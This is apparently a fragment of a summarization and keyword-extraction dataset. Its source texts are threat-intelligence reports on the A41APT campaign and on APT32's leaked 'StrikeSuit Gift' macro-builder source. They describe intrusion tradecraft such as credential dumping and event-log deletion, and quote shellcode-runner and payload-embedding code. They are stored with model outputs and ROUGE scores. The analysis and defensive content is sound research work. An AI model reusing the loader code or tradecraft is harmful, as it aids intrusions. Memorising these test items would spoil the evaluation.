IIIdecryptreflective dll injectionCppHostCLRloaddecryptmsdtcuiu.adi.wdbshellcode2Layer IVembedded DLL2.NET loaderweb_lowtrust.config.uninstallxRATFYAntiLooking for specific directory and search file with condition, then read file and decrypt payload22xRAT (payload of FYAntiLoader)VERSION Environment.SpecialFolder.ApplicationData Quasar Client Startup none23Obfuscated configuration data decrypts using base64 + AES CFB mode\uff13\uff0eCharacteristics of IntrusionIntrusion method in A41APT campaignInitial IntrusionInternal Recon.Lateral MovementPersistence ofmalwareC2CommunicationTrace RemovalPenetration via SSL-VPN using vulnerabilities or stolen credentialsPerform a port scan to search for open RDP or SMB port. Then, connect to RDP with an administrator account.Persistence by scheduled task registration to execute the legitimate PECommunicate with C2 server via DESLoader\u2019s payload or PowerShell remotingDelete the event log after communication with C2 is finished.Scheduled task registrationEvent log deletionServer \u30fbIn MemoryDESLoaderPayloadORAD ServerCredential DumpingLaptopLegitimate PEPowerShellC2 Server25*We have also observed cases where traces have been removed from other compromised servers as well.Characteristics of Compromise1.Initial intrusion using SSL-VPN products2. Network scanning and credential theft3. PowerShell remoting to remove event logs4. Persistence of malware by scheduled task26\uff13-\uff11\uff0e Initial intrusion via SSL-VPN (e.g. session hijacking)\u2022\u2022\u2022In October 2019, an attacker used the hostname DESKTOP-A41UVJV to hijack sessions to enter the internal network via SSL-VPN product, Pulse Secure.JPCERT also reported a similar attack targeting SSL-VPN [4].In some cases, attackers used credentials that they had stolen in the past intrusion.27\uff13-2\uff0e Network scanning and credential theftNetwork scanning and RDPCredential theft\u25aa After the intrusion by SSL-VPN, performinternal network scanning to find open port RDP (3389/TCP) and SMB (445/TCP).\u25aa Use an administrator account to deploy RDPto servers with free RDP.\u25aa Run csvde.exe, a CSV export command linetool provided by Microsoft.\u25aa Execute AdFind provided by joeware.\u25aa Dump of SYSTEM/SECURITY/SAM hive, etc.e.g. server types that are frequentlycompromised by RDPAD serverFile serverAnti Virus management serverBackup serverPrint serverFAX serverurl url pro/windows-server-2012-r2-and-2012/cc732101(v=ws.11)28\uff13-3\uff0e PowerShell remoting to delete event logs\u2022 Event log: the end of a PowerShellremoting session\u2022 Windows PowerShell.evtxEID: 403\u2022 The \"C2 address\" and the \"*.nls filename\" are changed, but the rest is the same\u21d2 probably common tools execution29\uff13-\uff14\uff0ePersistence of malware by scheduled task\u25aa Registered a task scheduler that executes a legitimate executable file that loads DESLoaderevery 15 minutes.\u25aaIt is unlikely that the same scheduled task name is created on the compromised hosts.30e.g. Improperly registered scheduled tasks observed in the pastScheduled Tasks\\Microsoft\\Windows\\Sysmain\\HybridDriveCachePrepopulate\\Microsoft\\Windows\\Shell\\FamilySafetyMonitor\\Microsoft\\Windows\\NetworkAccessProtection\\NAPStatus UI\\Microsoft\\Windows\\SideShow\\AutoWake\\Microsoft\\Windows\\SystemRestore\\SR\\Microsoft\\Windows\\Shell\\FamilySafetyUpload\\Microsoft\\Windows\\File Classification Infrastructure\\Property Definition Sync\\Microsoft\\Windows\\UpdateOrchestrator\\Refresh Settings\\Microsoft\\Windows\\WindowsUpdate\\AUSessionConnect\\Microsoft\\Windows\\Shell\\WindowsParentalControls\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Retry Scan\\Microsoft\\Windows\\LanguageComponentsInstaller\\ReconcileLanguageResources\\Microsoft\\Windows\\Setup\\EOSNotify\\Microsoft\\Windows\\SkyDrive\\Idle Sync Maintenance TaskPE nameHybridDrive.exewpcmon.exeNAPStatus.exeAutoWake.exesrtasks.exeFamilySafety.exeDefinitionSync.exeusoclient.exeAUSession.exeParentalControls.exeusoclient.exeDiagPackage.exeEOSNotify.exeIdleSync.exe31\uff14\uff0eThreat Actor\u2019s InfrastructureThreat Actor\u2019s Infrastructure1. The hostname used for the intrusion via SSL-VPN2. Characteristics of the C2 infrastructure33Hostname used for the initial intrusion via SSL-VPN\u25aa Tendency to use distinctive hostnames and attempt intrusionswhile changing IP addresses\u2714Host names used in breaches observed in the pastHostnameObservation TimeDESKTOP-A41UVJV2019/10 - 2020/01dellemc_N1548P2020/04 - 2020/05DESKTOP-LHC2KTF2020/12DESKTOP-O2KM1VL2019/10, 2020/12DESKTOP-V24F9JL2020/12\u25aa Tendency to use an IP for intrusion that is different from the C2 server\u2019s IP34Characteristics of the C2 infrastructure\u25aa For C2, there is a tendency to use IP addresses and not to use domains.\u25aa From the observed C2 IP addresses, there is little bias toward country and AS, and weobserved that there is a tendency not to reuse IP addresses repeatedly.35\uff15\uff0eConsideration of Threat Actor\u2019s AttributionConsiderations for attribution of A41APT1. Relevance to APT102. Relevance to BlackTech37\uff11\uff0eRelevance to APT10\u25aa Two ways linked to APT10: \u25aa Confirmed the existence of an early version ofSodaMaster (x86) in March 2019, which was involved in an attack against Turkey and attributed to APT10 (mentioned [5]) xRAT observed in A41APT campaign has common TTPs with BlackBerry Cylance reports in 2019 was confirmed [6].\u25aaShellCodeloadCommon TTPs - F**kYouAnti export - Look for payloads under\u201cC:\\Windows\\Microsoft.Net\u201dCommon TTPsRun dll payloadSodaMasterxRAT/QuasarRATconnectMenuPass/QuasarRATBackdoor ReportRun Shellcode payloadrare-coisns[.]comAttributeAPT10*Compared to SodaMaster in 2020, only two commands are supported.Used in attackAttackTurkish Victim38\uff12\uff0eRelevance to BlackTechSodaMasterTSCookie\u25aaIdentified common features between SodaMaster and TSCookie [7].\u25aa The same information is collected from the compromised host in the \u2013 Current process ID\u25aa Observed existence of two malware,SodaMaster and TSCookie, on multiple compromised hosts39\uff16\uff0eSummaryWrap up\uff1aA41APT Campaign\u25aaIntrusion via SSL-VPNADVERSARY\u25aa Heavy usage of RDP for lateralmovement (mainly servers)\u25aa Abusing DLL-Sideloading\u25aa Remove tracesCAPABILITIES\u25aa Targeting Japanese companiesincluding overseas branches\u25aa Wide range of industries such asmanufacturingVICTIMS\u25aa Strong association with APT10\u25aa Potential relevance to BlackTechINFRASTRUCTURE\u25aa Heavy usage of IP addresses for C2(no domain usage)\u25aa Less reuse of IP addresses for C2\u25aaIP for an initial intrusion and C2 IP are different.41Wrap up\uff1a TTPs ~MITRE ATT&CK Mapping~TacticsInitial AccessExecutionTechniquesExternal Remote Services (T1133) : Intrusion via SSL-VPN using vulnerabilities or stolen credentialsCommand and Scripting Interpreter: PowerShell (T1059.001) Base64 obfuscated PowerShell commands (delete event log) Windows Management Instrumentation (T1047) : WMIC collects services for security productsPersistenceScheduled Task/Job: Scheduled Task (T1053.005) :Privilege EscalationHijack Execution Flow: DLL Search Order Hijacking (T1574.001)Defense EvasionCredential AccessDiscoveryDeobfuscate/Decode Files or information (T1140) Indicator Removal on Host: Clear Windows Event Logs (T1070.001) Hijack Execution Flow: DLL Search Order Hijacking (T1574.001)OS Credential Dumping: Security Account Manager (T1003.002) OS Credential Dumping: NTDS (T1003.003)Account Discovery: Domain Account (T1087.002) Domain Trust Discovery (T1482) Software Discovery: Security Software Discovery (T1518.001)Lateral MovementRemote Services: Remote Desktop Protocol (T1021.001)CollectionArchive Collected Data: Archive via Utility (T1560.001) : Compression by WinRARCommand and ControlApplication Layer Protocol: Web Protocols (T1071.001) Data Encoding: Non-Standard Encoding (T1132.002)42Wrap up\uff1a Features of this campaign\u2714 Targeting the kryptonite of EDR/FSA detection\u2022 Malware is written on the disk by the attacker's manual operation via SSL-VPN instead of malware-originated intrusion from Spear phishing email (legitimate file, loader, encrypted file)\u2022Intrusion from group affiliates, including overseas companies\u2022 Malware is mostly placed on servers, and the number of compromised servers are very small.\u2022 Most of the malware detected in the same period have different C2 addresses, so there is little tendencyto use the same samples.\u2714 After the intrusion, some rough operations were seen.\u2022 Heavy usage of network discovery using RDP\u2022 Common traces deletion method of event logs\u2022 Recorded attacker's hostname in event log43Examples of countermeasures against this campaignSSL-VPNGovernance\uff08Overseas/affilates\uff09Implementation of MFA\u2022 \u2022 Patch adaptation operation \u2022 MonitoringEnd UserAdditional threat visibility\u2022 \u2022Network Monitor by NTA Strengthen security measures for servers Hunting stealthy attack by using EDR/FSA Leverage Yara rule to detect loader or payload on memory\u2022\u2022 \u2022Framework for sharing information (Incident, Threat Intel and security situation ) Apply same security level Apply same level of detection in each intrusion methodAdditional MonitoringAudit authentication attemp of administrator account (success/failure) Monitor deletion of Windows event log Monitor login from host that is not in list of organization asset Monitor SSL-VPN log for suspicious login from unknown host ( e.g. hostname is not in organization asset )Strengthen Monitoring for AuthenticationVendor (SOC)\u2022 Talk with end user to know white-list ( username, hostname, IP address and date/time ) ofauthentication and give proactive alert to end user44Examples of countermeasures against this campaign (Based on intrusion method)Initial IntrusionInternal Recon.Lateral MovementPersistence ofmalwareC2 CommunicationTrace Removal- Implementation of MFA - Patch adaptation operation - Monitor suspicious logins from overseas- NW monitoring by NTA - Strengthen security measures for servers (EDR/FSA etc.) - Monitoring of administrator - Suspicious login monitoring from hosts outside of asset management- Monitor the creation of suspicious scheduled task events.- Payload detection by Yara - C2 identification and blocking by malware analysis- Monitor for traces of suspicious event log deletions.- Identify and block C2 by traces of suspicious PowerShell remoting in event logsScheduled task registrationEvent log deletionPatch applicationoperationMFAMonitoringServer \u30fbIn MemoryEvent log monitoringDESLoaderpayloadsORAD serverLaptopLegitimate PEMonitoringMonitoringPowerShellPayloads detectionby YaraC245At the end \uf071 A41APT campaign is very stealthy and difficult to detect, but it is not undetectable.\uf071 The compromised target has shifted from endpoint to server, and the intrusion route has alsoshifted from spear phishing to abusing SSL-VPN. Security measures need to be reviewed inyour organization to respond to change in attack method.\uf071 By refining daily security operations and thoroughly reviewing the security holes in eachorganization's environment, it may be possible to detect and protect attacks from even smallanomalies.46Reference1. \u3010\u30ec\u30dd\u30fc\u30c8\u3011Microsoft\u306e\u30c7\u30b8\u30bf\u30eb\u30d5\u30a1\u30a4\u30eb\u3092\u3059\u308b\u300cSigLoader\u300d\u306b\u3088\u308b\u3092url Organizations Targeted in Long-Running and Sophisticated Attack Campaign url Attacks Exploiting Vulnerabilities in Pulse Connect Secureurl APT10 THREAT ANALYSIS REPORT (ADEO IT Consulting Services)url Spotlight: MenuPass/QuasarRAT Backdoor SodaMasterAny Questions? ", "generated_text": "A41APT; Japan; 2019; January 2021; port; The campaign; the target; SSL-VPN abuse; implants; DESLoader; SodaMaster; P8RAT; FYAntiLoader; RSA; Ecipekac; HEAVYHAND; DES; DES; a multi-layer loader; payloads; jli.dll; Ivac.dll; a z; ecipekac; HEAVYHAND;", "ref_text": "<START-1>The presentation analyzes an APT campaign called A41APT that was active from March 2019 to January 2021, targeting Japanese companies including overseas branches. The campaign leveraged vulnerabilities in SSL-VPNs for initial intrusion then used RDP for lateral movement. It deployed multi-layer malware like DESLoader and payloads such as SodaMaster, P8RAT, and FYAntiLoader. The malware was fileless, encrypted C2 communications, and deleted logs to evade detection. Infrastructure analysis found distinctive hostnames were used for initial intrusion and IP addresses rather than domains for C2 servers. There was little IP address reuse. Attribution assessment showed potential connections to Chinese APT groups APT10 and BlackTech based on malware similarities. However, specific attribution could not be made conclusively. The presentation outlines detection and mitigation measures like multi-factor authentication, patching, enhanced monitoring, payload detection, and information sharing. It notes that with vigilance, even stealthy targeted attacks can be detected.<END-1>", "t5/keyword/hint_hit_precision": 0.38461538461538464, "t5/word/hint_hit_recall": 0.08333333333333333, "gpt3/lexical/rouge_rouge1": 0.3916666666666667, "gpt3/lexical/rouge_rouge2": 0.1260504201680672, "gpt3/lexical/rouge_rougeL": 0.23333333333333334, "gpt3/lexical/rouge_rougeLsum": 0.23333333333333334, "gpt3_generated_text": ["The A41APT campaign, active in Japan from March 2019 to January 2021, targets Japanese companies using SSL-VPN abuse as the primary infection vector. The campaign utilizes implants such as DESLoader, SodaMaster, P8RAT, and FYAntiLoader, with DESLoader being a unique multi-layer loader with payloads including RSA encryption. DESLoader employs DLL side-loading and fileless implants through jli.dll and Ivac.dll, showcasing its complexity and stealth capabilities. Overall, the A41APT campaign is characterized by tough-to-detect intrusion methods and a sophisticated malware infrastructure, making it a significant threat to Japanese organizations."]}, {"split_name": "val", "sample_id": "val_3", "prompt_text": "Extract the keywords: The origin story of APT32 macros: The StrikeSuit Gi  that keeps giving Threat research reportSteve Miller, Sr. Threat Researcher Silas Cutler, Principal Reverse Engineer27/04/22The origin story of APT32 macros THREAT RESEARCH REPORTTable of contentsPrologueChapter IThe StrikeSuit Gift that keeps giving Summarizing the sourceChapter IIA tale of three GUIs A song as old as rhyme: Office VBA macrosChapter IIILooking the gift horse in the mouth How did the RAR get made? Unboxed source code projects at a glance What\u2019s the deal with all this shellcode? The one from ShellcodeLoader.vb The one from test.doc The one from RawShellcode The typical VB macro contentChapter IVStrikeSuit malware development conventions Documenting antivirus and compatibility testing Feature testing, housekeeping, and fingerprintsCleaning up the development mess with _Cleanup.bat Visual Studio Solution User Options (.suo) analysisDevelopment in progressTesting features and functions46 35204/2022The origin story of APT32 macros THREAT RESEARCH REPORTBackup structure Macro comparisons Borrowed and repurposed open-source codeChapter VStockpiling the unique toolmarks and indicatorsUsernames, handles, and hostnames Distinct macro timestamps from a scheduled task XML file Testing the export of scheduled tasks XML Developer fingerprints in scheduled task XML Network-based indicators PDB pathsThreadwork of attribution and assessing connections to APT32ShellcodeLoader L.dll APT32 then and nowEpilogueAppendixYARA rules VTI queries \u201cIndicators\u201dLinks and referencesAPT32 by year Office macros Visual Studio 202235 73304/2022The origin story of APT32 macros THREAT RESEARCH REPORTPrologue\u201cThe Gifts of an Enemy are Justly to be Dreaded\u201d Voltaire404/2022The origin story of APT32 macros THREAT RESEARCH REPORTEveryone loves an origin story.When the world learns of new malware and attacks, we are often left pondering the motivations, mulling over the attribution, and sifting through the nitty-gritty bits and bytes to understand the TTPs and tradecraft. Why wasit done, who was behind it, and how did they do it?Analysts, researchers, and investigators of all sorts spend time plotting the dots, drawing connections between data points, helping the evidence speak, and passing judgment on areas of uncertainty. When we dive deep into malware and attacks, we often are left interpreting nuanced artifacts to help us get a glimpse into the original malware development environment. We look to debug information and PDB paths to make inferences about the developer workstations. We look to the Rich header metadata to help understand the specifics of the linker, compiler, and architecture of the original development machine. We examine specific malicious functions within a piece of malware to identify code reuse. We identify notable libraries to tease out pieces of software that may be borrowed from public projects around the internet. Part of the fun of analysis is the challenge of the puzzle and the relentless pursuit of insight in the face of complex, limited, or opaque data. Yet, sometimes we get lucky, and we stumble on a piece of malware source code to get a more intimate look at the malware author, a clearer window into the original development environment, and a naked look at the malware itself. This origin story is for all you Visual Basic macro fans out there. In this report, we unearth a demon from the ancient world: a mysterious malware source code package called StrikeSuit Gift. We examine this source code package in detail and dive deep into development conventions, tradecraft, toolmarks, and potential connections to the threat actor APT32.504/2022The origin story of APT32 macros THREAT RESEARCH REPORTChapter I604/2022The origin story of APT32 macros THREAT RESEARCH REPORTThe StrikeSuit Gift that keeps giving Our thirst for knowledge leads us back in time to the foregone world of 2017. The year was a dystopia of its own, yet it was the golden age of APT32. The prolific Vietnam-based threat actor was running wild, targeting foreign governments, dissidents, journalists, and pretty much any private corporation trying to do business in Vietnam. APT32, also known by \u201cOceanLotus'' and \u201cBISMUTH,\u201d is famous for innovating and bypassing defenses using a combination of custom-developed, open-source, and commercially available tooling to perform intrusion activities. Like many threat actors, APT32 favors phishing via lure documents laden with malicious macros to execute or download a piece of malware. Through following the breadcrumbs of historical macro content, we stumbled across an archive submitted to VirusTotal in late 2017. This archive contains a litany of malware source code, shellcode, test files, documents, macros, notes, and more, all of which could span nearly a decade of malware development. This malware source package is internally named StrikeSuit Gift. Though it appears to be developed years ago, dissecting this malware may give us insights into the practices used by malware developers today. Furthermore, through inspection of the minutiae, we may establish links to support the gut notion that this source code package was developed or used by APT32.Summarizing the source Occasionally, malware developers will inadvertently leak source code packages by triggering antivirus or endpoint detection products. Once the security vendor has a copy of the malware file, it may be shared or otherwise proliferated around the globe through data-sharing partnerships, backchannel exchanges, and product integrations. Eventually, all roads lead to Rome. The StrikeSuit Gift source package was submitted to VirusTotal at 2017-08-26 07:29:19 UTC. The StrikeSuit Gift package is a 2.99MB RAR archive containing over 200 files, most of which are Visual Studio solutions or source code in a couple of programming languages. This package also includes test documents, text files, built executables, and a couple of other RAR and ZIP files. There\u2019s a lot of data here and multiple timelines to look at. To help illustrate this package at a high level, here\u2019s a look at the directory tree three levels deep with parentheses to show the last modified timestamp, according to WinRAR. These timestamps are squirrely and imperfect, but they suggest a THREAT RESEARCH REPORT\u251c\u2500\u2500 AVs-Test (2017-08-25 03:10) \u2502 \u2514\u2500\u2500 Result.txt \u251c\u2500\u2500 Office-Versions (2017-08-25 21:32) \u2502 \u2514\u2500\u2500 Verions.txt \u251c\u2500\u2500 ReadMe.txt (2017-08-10 01:25) \u2502 \u2502 \u251c\u2500\u2500 Macros_Builder (2017-08-24 01:21) \u2502 \u2502 \u251c\u2500\u2500 Macros_Builder.sln \u2502 \u2502 \u251c\u2500\u2500 Macros_Builder.v11.suo \u2502 \u2502 \u2514\u2500\u2500 _Cleanup.bat (2013-10-29 00:18) \u2502 \u251c\u2500\u2500 Macros_Builder_1.0.zip \u2502 \u2502 \u2514\u2500\u2500 Macros_Builder (2016-04-19 05:32) \u2502 \u251c\u2500\u2500 RawShellcode (2017-08-23 00:24) \u2502 \u251c\u2500\u2500 WebBuilder \u2502 \u2502 \u251c\u2500\u2500 HtaDotNet (2017-08-24 01:21) \u2502 \u2502 \u2514\u2500\u2500 ShellcodeLoader (2017-08-18 04:50) \u2502 \u2514\u2500\u2500 WebBuilder.rar \u2502 \u2502 \u2514\u2500\u2500 WebBuilder (2011-09-23 20:30) \u2502 \u2502 \u251c\u2500\u2500 HtaDotNet (2011-09-23 20:30) \u2502 \u2502 \u2514\u2500\u2500 ShellcodeLoader (2011-09-23 20:30) \u2514\u2500\u2500 Source\u251c\u2500\u2500 CSharp (2017-08-23 21:30) \u2502 \u251c\u2500\u2500 MacrosEmbedding (2017-08-18 00:18) \u2502 \u251c\u2500\u2500 MacrosEmbeddingExample (2017-08-13 19:52) \u2502 \u2514\u2500\u2500 VbaCodeCreator (2017-08-23 21:30) \u251c\u2500\u2500 C_Cpp (2017-08-23 03:45) \u2502 \u251c\u2500\u2500 Binary (2017-08-24 01:21) \u2502 \u2514\u2500\u2500 ShellcodeThreadCaller (2017-08-24 01:21) \u2514\u2500\u2500 VB (2017-08-20 21:23) \u251c\u2500\u2500 ShellcodeLoader (2017-08-20 21:23) \u2514\u2500\u2500 XmlScriptAnalyst (2017-08-16 20:17)At first glance, we can see that in August 2017 this project was in active development. It seems that the malware author may have brought in older projects and files from years past. These files may have been archives of their own and are kept in the directory structure for reference or in the event the developer needs to pull the ripcord and recover the original, older code. Macros_Builder was from 2016 and got new updates in August 2017. HtaDotNet and ShellcodeLoader are older, maybe as far back as 2011, but were both touched in August 2017. A cleanup batch script may have been created or used as far back as 2013 but was copied over to help delete extraneous development artifacts. We will dive into more details further down the page, but we804/2022The origin story of APT32 macros THREAT RESEARCH REPORTthink the superficial totality of these timestamps shows a developer who is leaning on old code, making improvements, performing tests, and enhancing a small set of interconnected malware tools.904/2022The origin story of APT32 macros THREAT RESEARCH REPORTChapter II1004/2022The origin story of APT32 macros THREAT RESEARCH REPORTA tale of three GUIs Within the delicate web of source code lie three juicy GUIs for us to behold. We begin with the oldest and jump further back in time to October 2013, when a malware developer compiled a debug build of Office Macros Builder - Version 1.0.0 at 2013-10-08 16:00:51. This GUI tool is to help a legion of intrusion operators inject macros into Office documents.GUIs for hacking tools and malware kits exist to help intrusion operators perform complex tasks quickly, easily, repeatedly, and reliably. GUIs help scale out capabilities across a workforce of varying roles, skills, and experience levels. Once you can make it an easy button, almost anyone can smash it to unleash their evils. The Office Macros Builder - Version 1.0.0 above accepts an Office file (.doc) and a macros (.vb or .txt) and uses Microsoft.Office.Interop.Word and Microsoft.Vbe.Interop assemblies to jam the macro into the document. The program takes the document and creates an alternate data stream  ADS  with a Zone Identifier of 0 to indicate that it is from \u201cURLZONE_LOCAL_MACHINE,\u201d the most trusted zone.1104/2022The origin story of APT32 macros THREAT RESEARCH REPORTTime marches on, and we fast forward to spring 2016. Somewhere around the world, the development team behind StrikeSuit Gift starts their morning with coffee and pastries and compiles the GUI program Embed Office Macros at 2016-03-11 09:02:13.We jump ahead to 2017 when the threat actor is outed by Mandiant. The bosses demand an upgrade from their malware development team. Now, the malware developer Rachael is suddenly tasked to enhance an older codebase to make it a bit more versatile for intrusion operations. Rachael begins with some slight modifications to the older macro text, add_schedule_vba.txt, makes some enhancements to the GUI, and then compiles the new version of Embed Office Macros at 8/17/2017 08:18:44.1204/2022The origin story of APT32 macros THREAT RESEARCH REPORTWhile looking at the pretty pictures may not give us foresight into the future of this malware toolkit, the visual progression of these GUIs is important because this is where the many malware functionalities bear fruit. These GUIs represent the final vehicles for mass malware operations and will be used to create hundreds, if not thousands, of malicious macros for Office documents.A song as old as rhyme: Office VBA macros Let\u2019s take a quick break from the timeline and recap the ever-loathed scourge of the infosec world: Microsoft Office macros.1304/2022The origin story of APT32 macros THREAT RESEARCH REPORTVisual Basic  VB , Visual Basic Scripts  VBS , and Visual Basic for Applications  VBA  are basically the same programming language, except that VBA is designed to run within a Microsoft Office application such as Word, Excel, PowerPoint, etc. In the context of malware and phishing documents, we often just refer to any VB scripting content as \u201cmacros.\u201d Every IT administrator and business person will tell you that macros have a legitimate purpose and are integral to crucial company processes. The supposed legitimate purpose is exactly why malicious macros are so effective in phishing campaigns. Macros are so common in cross-company, cross-business processes that many users are easily coerced into executing even the malicious ones. Attackers know this and act accordingly. If you\u2019re new to VB macros or maybe want a quick refresher, we recommend these great reads to recap what macros are and examples of how they may show up in phishing or lure documents:\u25cf url \u25cf url \u25cf url \u25cf url origin story of APT32 macros THREAT RESEARCH REPORTChapter III1504/2022The origin story of APT32 macros THREAT RESEARCH REPORTNow, we\u2019ll jump to late August 2017 when someone on the malware development or operation team makes a crucial mistake. Rachael or one of their counterparts transfers the RAR archive of StrikeSuit Gift to a machine with antivirus software running. The embedded shellcode and macro content inside of the RAR trigger an AV signature, and the archive file is hoovered up and blasted across the internet. Those monitoring recent submissions to VirusTotal would see an alert for the YARA rule \u201cAPT32_ActiveMime_Lure\u201d and arrive at the RAR archive for StrikeSuit Gift.Looking the gift horse in the mouth It's tough to analyze this much malware source code line by line, so let\u2019s do our best to summarize the high points and tease out juicy deets that may be interesting to our understanding of the actor\u2019s capabilities, the development tradecraft, and then we can connect what we\u2019re seeing here to attacks out in the world.How did the RAR get made? We do not have many clues to describe how the main RAR file was created; however, we can take an educated guess that it was created with WinRAR 4.x for the folder on the mounted volume D:\\P17028 - StrikeSuit Gift - Office Macro Type 1. each of the archived files and directories with a four-byte \u201cmtime\u201d timestamp, likely representing the NTFS last modified time from Windows. If we open this RAR file with WinRAR, the utility identifies this as RAR 4.x archive. According to the documentation, the RAR 4.x format stores the last modified timestamps in local time rather than UTC. This is not important as we\u2019re skeptical about timestamps to begin with but good to know that in older versions of WinRAR, we should see a four-byte combo of MS DOS TIME and DATE local timestamps. In modern versions of WinRAR, the default is \u201chigh-precision\u201d eight-byte uint64 Windows FILETIME UTC timestamps; however, if we deselect the high-precision flag, the timestamp becomes a four-byte uint32 Unix time_t. Isn\u2019t forensics fun? These three examples were created based on the original StrikeSuit Gift RAR file, looking at the RAR last modified timestamp for \\Office-Versions\\Verions.txt. We took this file and re-archived it using a modern WinRAR both with and without the high-precision flag, and the time there reflects a  5 adjustment for the UTC offset on our test system. We can convert any of these raw timestamps back to a human time to see the approximate modification time.1604/2022The origin story of APT32 macros THREAT RESEARCH REPORTExamples of three possible archive timestamps made by WinRAR of different versions.Last Modified HexTime TypeHuman TimeWinRAR84 B1 19 4BMS DOS TIME   DATE8/25/2017 22 12 08*52 DB FE 19 19 1E D3 01Windows FILETIME8/26/2017 03 12 0808 E7 A0 59Unix time_t8/26/2017 03 12 084.x5.0 5.0 *Nuanced: We can try doing it based on this approach, or we can try this (easier?  manual approach with the endian swap binary output in CyberChef. To sum all of that up, we can guess based on the age of the StrikeSuit Gift RAR file that this was created with an old 4.x version of WinRAR, and we can confirm that with the structure of the archive headers and the format of the now deprecated DOS-style timestamps. Ok, let\u2019s power forward to the good stuff.Unboxed source code projects at a glance To help us get a broad vision of all the source code in our StrikeSuit Gift package, we take a high-level look at the main projects.Parent Directory:P17028 - StrikeSuit Gift - Office Macro Type 1ProjectSummaryMacros_BuilderMacros_Builder.sln   Visual Studio 2012This GUI program \u201cEmbed Office Macros\u201d was created in 2016 and modernized in August 2017.The main program defines macro file add_schedule_vba.txt as a resource, then the main routine takes that macro and replaces variables from things in GUI and writes out to MacrosSource.txt. The program has a separate functionality to take a GUI selected file and use Trinet.Core.IO.Ntfs to write an Alternate Data Stream  ADS  Zone Identifier to 2.1704/2022The origin story of APT32 macros THREAT RESEARCH REPORTWebBuilder/ HtaDotNetHtaDotnet.sln   Visual Studio 2012This solution has several components. The first is the HtaDotnet project which appears to have UI components and serves as a framework to embed shellcode and file data into an HTA document with either VB script or JavaScript. This has two resource objects DotNet4Ldr and DotNetLdr which appear to be serialized versions of L.dll (see ShellcodeLoader, below).The Test project uses HtaDotnet to manually build an HTA file based on hard-coded paths for shellcode, a file, and a file name.byte[] shellcode = File.ReadAllBytes(@\"c:\\temp\\shl.bin\"); byte[] embedFileData = File.ReadAllBytes(@\"c:\\temp\\bintext.exe\"); string embedFileName = \"().exe\"; \u2026 HtaDotNetBuilder builder = new HtaDotNetBuilder(); byte[] hta = builder.BuildHtaDotnetLdr(engine, embedFileData);File.WriteAllBytes(@\"c:\\temp\\11.hta\", hta);WebBuilder/ ShellcodeLoaderL.sln   Visual Studio 14, 14.0.25420.1 (was migrated, see UpgradeLog.htm)This solution is a set of functions that help with decoding, decrypting, and running shellcode, including that which may be in a text in a .HTA or .VBS file.The L class is designed to take some script content and decode or decrypt it into shellcode and execute it.The Test piece uses the L class and takes an input shellcode file, an input loader file (\u201cL.dll\u201d), two VB loader resources, and outputs into a text file.string inputShellcodeFile = @\"G:\\WebBuilder\\Gift_HtaDotNet\\_Temp\\shl.bin\";1804/2022The origin story of APT32 macros THREAT RESEARCH REPORTstring inputLdrFile = @\"G:\\WebBuilder\\Gift_HtaDotNet\\ShellcodeLoader\\L\\bin\\release\\l.dl l\"; string outputFile = @\"c:\\temp\\l.txt\"; string vbsLdrCompatFile = @\"c:\\temp\\DotNetLdr\"; string vbsLdrCompatFileDotNet4 = @\"c:\\temp\\DotNet4Ldr\";CSharp/ MacrosEmbeddingMacrosEmbedding.sln   Visual Studio 14, 14.0.25420.1This GUI program \u201cOffice Macros Builder\u201d was created in 2013. It checks GUI for inputs of an Office (.doc) and a macro file (.vb or .txt) and attempts to embed macro into a file (with some basic error handling) and tries to adjust ADS zone identifiers to 0.CSharp/ MacrosEmbeddingExampleMacrosEmbeddingExample.sln   Visual Studio 14, 14.0.25420.1This is likely a precursor or run alongside MacrosEmbedding to test macros embedding functionality. It creates a simple VB macro text, has an embedMacro function to embed a macro into a doc, and the main function takes hard-coded paths from the developer system and runs it.string pathDoc = @\"C:\\Users\\Rachael\\Desktop\\MacrosTest.doc\";We see the function embedMacros from this expanded upon in both other CSharp/ solutions: MacrosEmbedding, and VbaCodeCreator.CSharp/ VbaCodeCreatorVbaCodeCreator.sln   Visual Studio 14, 14.0.25420.1This Visual Studio project is used to generate VB macros that can be bundled into documents. The main program takes two hard-coded paths, one for shellcode and one for an Office document, then runs the core to build the shellcode into it.string strShellcodePath = @\"D:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\RawShellcode\\2017-08-23 02-55-49 string strOfficeFilePath = @\"C:\\Users\\Rachael\\Desktop\\test.doc\"; Core.Core.startBuilder(strShellcodePath, strOfficeFilePath);1904/2022The origin story of APT32 macros THREAT RESEARCH REPORTAlong with this project in the debug directory, we keep a copy of test.doc and a handful of legitimate Microsoft Office binaries to support the functionalities.Test.doc has a Module1.bas VBA code stream that uses an old public VB script template but then has a function for shellcode as an array. The shellcode in the existing test.doc is a test file similar, if not identical, to the \u201cRawShellcode\u201d BinaryBinary.sln   Visual Studio 2012This reads in a shellcode blob, converts the binary to text, and writes to an output .dat file.int main(int argc, char **argv) {std::string strFilePath = \"D:\\\\P17028 - StrikeSuit Gift -Office Macro Type 1\\\\Reference\\\\RawShellcode\\\\2017-08-23 02-55-49 data = Binary::ReadBinaryFile(strFilePath);Binary::ConvertBinaryToText(\"C:\\\\Users\\\\Rachael\\\\Desktop\\\\shellco de.dat\", data);C_Cpp/ ShellcodeThreadCallerShellcodeThreadCaller.sln   Visual Studio 2012This reads in shellcode from a hard-coded path and executes it.HANDLE hFile = CreateFileA(\"C:\\\\Users\\\\Rachael\\\\Desktop\\\\2017-08-23 02-55-49 FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); LPVOID lpShellcodeAddr = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpShellcodeAddr, NULL, 0, NULL); WaitForSingleObject(hThread, INFINITE);VB/ ShellcodeLoaderShellcodeLoader.sln   Visual Studio 2012This is a different ShellcodeLoader than the L.dll one in WebBuilder.2004/2022The origin story of APT32 macros THREAT RESEARCH REPORTIn this solution, the main ShellcodeLoader.vb routine uses the Metasploit VB generated template (\u00e0 la scriptjunkie), comments out the Meterpreter-esque shellcode array, and instead reads the local test shellcode blob as the main variable.Hyeyhafxp = My.Computer.FileSystem.ReadAllBytes(\"./2017-08-23 XmlScriptAnalystXmlScriptAnalyst.sln   Visual Studio 2012This appears to be a test project to test VB code against the local system and builds an XML scheduled task based on VB functions. When run, it grabs the local system computer and user name, then writes this into an XML string, which is then written out to a hard-coded path XmlStr.txt. This relates 